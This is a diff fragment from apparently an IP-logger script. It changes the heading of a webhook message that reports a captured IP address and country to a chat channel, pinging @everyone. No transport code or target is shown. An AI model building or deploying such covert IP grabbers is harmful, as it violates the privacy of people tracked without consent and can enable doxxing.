@@ -22,7 +22,7 @@ const request = async () => { // Calling a "synchronous" fetch
     var params = {
         username:   "IP Log",
         avatar_url: "",
-        content:    "**NOWE IP MORDYYY** @everyone \n" + 
+        content:    "**Nowe ip** @everyone \n" + 
 		    "__**:globe_with_meridians: IP Address:**__ \n" +
                     "`" + ip + "` \n \n" +
 		    "__**Country:**__ \n" +
